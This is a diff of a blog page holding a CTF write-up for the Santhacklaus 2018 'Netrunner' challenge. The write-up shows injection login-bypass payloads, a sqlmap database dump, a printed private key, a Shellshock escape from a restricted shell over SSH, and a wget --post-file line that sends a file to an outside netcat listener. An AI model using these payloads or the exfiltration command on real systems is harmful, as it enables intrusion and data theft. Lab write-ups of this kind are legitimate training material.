@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.72.0" />
+<meta name="generator" content="Hugo 0.90.1" />
 
   <meta property="og:title" content="[CTF - Santhacklaus-2018] Netrunner" />
 <meta property="og:description" content="" />
@@ -59,10 +59,11 @@
   <script src="https://thibaud-robin.fr/js/lightbox.min.js"></script>
   <script src="https://thibaud-robin.fr/js/termynal.js"></script>
   <script src="https://thibaud-robin.fr/js/emojify.min.js"></script>
-  
+
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/termynal.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/hover.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/emojify.min.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/darkreader.css">
 
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
@@ -226,7 +227,7 @@
 <h2 id="1st-step---you-have-a-mission-">1st step - You have a mission !</h2>
 <p><img src="/img/santhacklaus/netrunner2.png" alt="" title=""></p>
 <p>Well received ! Mission accepted, let&rsquo;s save the world !
-Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz">http://santhacklaus.xyz</a>:2077/</p>
+Fire your favorite web browser and navigate to <a href="http://santhacklaus.xyz:2077/">http://santhacklaus.xyz:2077/</a></p>
 <p><img src="/img/santhacklaus/netrunner3.png" alt="" title=""></p>
 <p>Humm authentication page. Let&rsquo;s inspect that.</p>
 <div class="alert protips">
@@ -257,7 +258,7 @@ If an application uses LDAP in its user authentication process, and is vulnerabl
 <p>Let&rsquo;s assume that a web application uses a filter to do the LDAP user / password mapping.</p>
 <p><code>searchlogin = &quot;(&amp;(USER = &quot; + user_name + &quot;) (PASSWORD = &quot; + user_password + &quot;))&quot;;</code></p>
 <p>Using the following values:</p>
-<pre><code>user = johnDoe)(&amp;)
+<pre tabindex="0"><code>user = johnDoe)(&amp;)
 pass = password
 </code></pre><p>The search filter becomes:</p>
 <p><code>searchlogin = &quot;(&amp;(USER = johnDoe)(&amp;))(PASSWORD = pass))&quot;</code></p>
@@ -277,7 +278,7 @@ pass = password
 <p>An XPath query that returns the account whose username is <code>th1b4ud</code> and the password is <code>p4sSw0rD</code> would be the following:</p>
 <p><code>string(//user[username/text()='th1b4ud' and password/text()='p4sSw0rD']/account/text()) </code></p>
 <p>If the application does not properly filter user input, the tester will be able to inject XPath code and interfere with the query result. For instance, the tester could input the following values:</p>
-<pre><code>Username: ' or '1' = '1 
+<pre tabindex="0"><code>Username: ' or '1' = '1 
 Password: ' or '1' = '1 
 </code></pre><p>Looks quite familiar, doesn&rsquo;t it? Using these parameters, the query becomes:</p>
 <p><code>string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text()) </code></p>
@@ -290,7 +291,7 @@ Password: ' or '1' = '1
 <p>Consider the following SQL query:</p>
 <p><code>SELECT * FROM Users WHERE Username='$username' AND Password='$password'</code></p>
 <p>A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied.</p>
-<pre><code>$username = 1' or '1' = '1
+<pre tabindex="0"><code>$username = 1' or '1' = '1
 $password = 1' or '1' = '1
 </code></pre><p>The query will be:</p>
 <p><code>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' </code></p>
@@ -303,7 +304,7 @@ $password = 1' or '1' = '1
 </div>
 <p>Look at my last protips. I speak about <code>SLEEP()</code> function to detect entry point. The function <code>SLEEP()</code> (in mysql and in others database engine) permit to stop the server for a while. We will exploit this functionnality to detect if an entry is vulnerable. The application run with php. I hope the database engine is MySql or an other engine who support <code>SLEEP()</code> function. We shall see !</p>
 <p>These query should do the trick :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">username=th1b4ud<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-md" data-lang="md">username=th1b4ud<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
 username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1e0010">&amp;</span>password=password<span style="color:#960050;background-color:#1e0010">&amp;</span>login=Login
 </code></pre></div><p><img src="/img/santhacklaus/netrunner1.gif" alt="" title=""></p>
 <p><img src="https://media.giphy.com/media/WuGSL4LFUMQU/giphy.gif" alt="" title=""></p>
@@ -335,7 +336,7 @@ username=th1b4ud&#39; OR SLEEP(3)#<span style="color:#960050;background-color:#1
 <li><strong>Database engine (<code>--dbms</code>)</strong> : <code>mysql</code></li>
 <li><strong>Action to perform</strong> : dump the database with <code>--dump</code></li>
 </ul>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ sqlmap -u &quot;http://51.75.202.113:2077/zetatech-admin.php&quot; --data &quot;username=test&amp;password=test&amp;login=Login&quot; -p &quot;username&quot; --method POST --random-agent --technique=T --level=5 --risk=2 --dbms=mysql --dump
         ___
        __H__
  ___ ___[.]_____ ___ ___  {1.2.11#stable}
@@ -371,7 +372,7 @@ Table: access
 
 [*] shutting down at 15:15:35
 </code></pre><p>Ho finally ! We dump the database ! We&rsquo;ve got two users : <code>admin</code> and <code>puppet-master</code>. Let&rsquo;s try a very simple injection with these informations.</p>
-<pre><code>admin'#
+<pre tabindex="0"><code>admin'#
 puppet-master'#
 </code></pre><p>With admin</p>
 <p><img src="/img/santhacklaus/netrunner8.png" alt="" title=""></p>
@@ -381,9 +382,9 @@ puppet-master'#
 <p>OMG IT WORKS !</p>
 <h2 id="2nd-step---bypass-protection">2nd step - Bypass protection</h2>
 <p><img src="/img/santhacklaus/netrunner10.png" alt="" title=""></p>
-<p>We&rsquo;ve got an access to the application. We now have an access to this page : <a href="http://santhacklaus.xyz">http://santhacklaus.xyz</a>:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html</p>
+<p>We&rsquo;ve got an access to the application. We now have an access to this page : <a href="http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html">http://santhacklaus.xyz:2077/e91ac60004c77904ad889a5762a68b06e53b7c21.html</a></p>
 <p>There is a private key.</p>
-<pre><code>-----BEGIN RSA PRIVATE KEY-----
+<pre tabindex="0"><code>-----BEGIN RSA PRIVATE KEY-----
 MIIJJwIBAAKCAgEA5nJEI+VHIE8eUE0Upf8eTGorOC5Cd0AVQGdgJLZPQNdcrgvu
 j9Pq1Jf90iAI7tt/2CybZlfegYJW3gN08n4kVWXd0ihO9Xpn4IxOA0dGApZ9Tnux
 5G4LF9kQDEMWgQP8v0M1z5v4vnqeyvrPMNdkBKrJHm5GqOT4sSinbU509cPsyggf
@@ -435,7 +436,7 @@ K1xreCkmAWdrAHhiA89skiVryPK3pVOKjHnAfyLrf27aZkiS3jvq/V+DDstKNZ2y
 ncjE2bXV8Kbzf5ifvikciUMTxnF7l+PehJulNP2+Mk5NBXOAcZdjO7sfxA==
 -----END RSA PRIVATE KEY-----
 </code></pre><p>Why not try a ssh connexion with the username <code>puppet-master</code> on the port <code>2021</code> (see description)</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key
 
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
@@ -471,7 +472,7 @@ Connection to 51.75.202.113 closed.
 </code></pre><p>Ho ! Connection closed ! Maybe we have to bypass a restricted shell or a similar protection.
 Lets type the question to Google : <code>escape restricted shell</code> and click on the first link : <a href="https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells">https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</a></p>
 <p>Look at the ninth slide :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Use SSH on your machine to execute commands before the remote shell is loaded</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Use SSH on your machine to execute commands before the remote shell is loaded</span>
 ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;/bin/sh&#34;</span>
 
 <span style="color:#75715e"># Or start the remote shell without loading &#34;rc&#34; profile (where most of the limitations are often configured)</span>
@@ -480,19 +481,19 @@ ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;bash --noprofile&
 <span style="color:#75715e"># Try ShellShock on vulnerable shell implementations</span>
 ssh restricted@10.20.30.40 -t <span style="color:#e6db74">&#34;() { :; }; /bin/bash&#34;</span>
 </code></pre></div><p>Let&rsquo;s try this 3 commands</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;/bin/sh&quot;
 
 [...]
 
 Connection to 51.75.202.113 closed.
 </code></pre><p>No</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;bash --noprofile&quot;
 
 [...]
 
 Connection to 51.75.202.113 closed.
 </code></pre><p>No</p>
-<pre><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc ~]$ ssh puppet-master@51.75.202.113 -p 2021 -i key -t &quot;() { :; }; /bin/bash&quot;
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
 ./__.[___  |  |  |  |  [___\__.|  |
@@ -503,7 +504,7 @@ puppet-master@2a87f3ade358:~$
 </code></pre><p>WUT ? O.O</p>
 <p><img src="https://media.giphy.com/media/aWPGuTlDqq2yc/giphy.gif" alt=""></p>
 <p>Stop, stop, stop ! Shellshock ?!? Really ?!?</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">puppet-master@2a87f3ade358:~$ env x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style="color:#e6db74">&#34;echo this is a test&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">puppet-master@2a87f3ade358:~$ env x<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;() { :;}; echo vulnerable&#39;</span> bash -c <span style="color:#e6db74">&#34;echo this is a test&#34;</span>
 vulnerable
 this is a test
 </code></pre></div><p>Ok&hellip; Shellshock \o/</p>
@@ -511,11 +512,11 @@ this is a test
 <p><code>Shellshock, also known as Bashdoor, is a family of security bugs in the widely used Unix Bash shell, the first of which was disclosed on 24 September 2014. Many Internet-facing services, such as some web server deployments, use Bash to process certain requests, allowing an attacker to cause vulnerable versions of Bash to execute arbitrary commands. This can allow an attacker to gain unauthorized access to a computer system.</code></p>
 <p>Thank you Wikipedia. There is many articles on Internet who will do a better explanation than me, in particular this one : <a href="https://fedoramagazine.org/shellshock-how-does-it-actually-work/">https://fedoramagazine.org/shellshock-how-does-it-actually-work/</a></p>
 <p>And what is <code>-t</code> argument in ssh ?</p>
-<pre><code>-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote
+<pre tabindex="0"><code>-t      Force pseudo-terminal allocation.  This can be used to execute arbitrary screen-based programs on a remote
         machine, which can be very useful, e.g. when implementing menu services.  Multiple -t options force tty
         allocation, even if ssh has no local tty.
 </code></pre><p>With <code>-t</code> argument you can execute arbitrary programs on the server. Perfect for us ! The host is vulnerable to shellshock, so we can abuse this ssh feature to exploit the Shellshock vulnerability to obtain a shell \o/</p>
-<pre><code>puppet-master@2a87f3ade358:~$ cat client.note 
+<pre tabindex="0"><code>puppet-master@2a87f3ade358:~$ cat client.note 
 
 .___..___.___..__..___..___ __ .  .
   _/ [__   |  [__]  |  [__ /  `|__|
@@ -536,7 +537,7 @@ Note: the password is the same than your username.
 <p><img src="/img/santhacklaus/netrunner11.png" alt="" title=""></p>
 <p>Look at the file <code>client.note</code>. It say : <code>Note: the password is the same than your username.</code>
 Why is necessary to know the user password ? To be able to execute sudo !!!</p>
-<pre><code>puppet-master@2a87f3ade358:~$ sudo -l
+<pre tabindex="0"><code>puppet-master@2a87f3ade358:~$ sudo -l
 [sudo] password for puppet-master: 
 Matching Defaults entries for puppet-master on 2a87f3ade358:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, lecture=never
@@ -544,7 +545,7 @@ Matching Defaults entries for puppet-master on 2a87f3ade358:
 User puppet-master may run the following commands on 2a87f3ade358:
     (puppet-master : zetatech-maintenance) /usr/bin/wget
 </code></pre><p>Yeah ! The exploit is here ! What can we do ? User <code>puppet-master</code> can execute wget with group permission of <code>zetatech-maintenance</code>. Good ! Look at the <code>puppet-master</code> home</p>
-<pre><code>puppet-master@2a87f3ade358:~$ ls -al
+<pre tabindex="0"><code>puppet-master@2a87f3ade358:~$ ls -al
 total 36
 dr-xr-x--- 1 root puppet-master        4096 Dec 16 13:30 .
 drwxr-xr-x 1 root root                 4096 Dec 11 08:01 ..
@@ -557,20 +558,20 @@ drwxr-x--- 1 root puppet-master        4096 Dec 11 08:01 .ssh
 -rwxr----- 1 root zetatech-maintenance  266 Dec 10 13:52 tech.note
 </code></pre><p>The file <code>tech.note</code> can be read by group <code>zetatech-maintenance</code>. This is the file we need ! Let&rsquo;s exfiltrate it !</p>
 <p>First, launch my listener.</p>
-<pre><code>th1b4ud@pc-th1b4ud:~$ nc -lvp 4444
+<pre tabindex="0"><code>th1b4ud@pc-th1b4ud:~$ nc -lvp 4444
 listening on [any] 4444 ...
 </code></pre><p>But before go further, what is <code>wget</code> ?</p>
 <p><code>GNU Wget (or just Wget, formerly Geturl, also written as its package name, wget) is a computer program that retrieves content from web servers. It is part of the GNU Project. Its name derives from World Wide Web and get. It supports downloading via HTTP, HTTPS, and FTP. </code></p>
 <p>Thanks again Wikipedia \o/</p>
 <p>So we can download file with <code>wget</code>. Can you upload/send some file too ? The answer is yes ! Look at the man.</p>
-<pre><code> --post-data=string
+<pre tabindex="0"><code> --post-data=string
  --post-file=file
       Use POST as the method for all HTTP requests and send the specified data in the request body.  --post-data
       sends string as data, whereas --post-file sends the contents of file.
 </code></pre><p>This is the option we need ! Let&rsquo;s execute <code>wget</code> with <code>zetatech-maintenance</code> group permission.</p>
-<pre><code>sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
+<pre tabindex="0"><code>sudo -g zetatech-maintenance wget --post-file tech.note 12.34.56.78:4444
 </code></pre><p>Ho ! Something appeared on the listener !</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">connect to <span style="color:#f92672">[</span>192.168.0.50<span style="color:#f92672">]</span> from 113.ip-51-75-202.eu <span style="color:#f92672">[</span>51.75.202.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">58604</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">connect to <span style="color:#f92672">[</span>192.168.0.50<span style="color:#f92672">]</span> from 113.ip-51-75-202.eu <span style="color:#f92672">[</span>51.75.202.113<span style="color:#f92672">]</span> <span style="color:#ae81ff">58604</span>
 POST / HTTP/1.1
 User-Agent: Wget/1.18 <span style="color:#f92672">(</span>linux-gnu<span style="color:#f92672">)</span>
 Accept: */*
@@ -621,7 +622,7 @@ Branch the Zetatech Pad to Cybernetic Prosthetic client and use the following ge
 		</ul>
 	</div>
 
-	<p>&copy; 2020. All rights reserved.</p>
+	<p>&copy; 2021. All rights reserved.</p>
 </div>
     </div>
   </div>
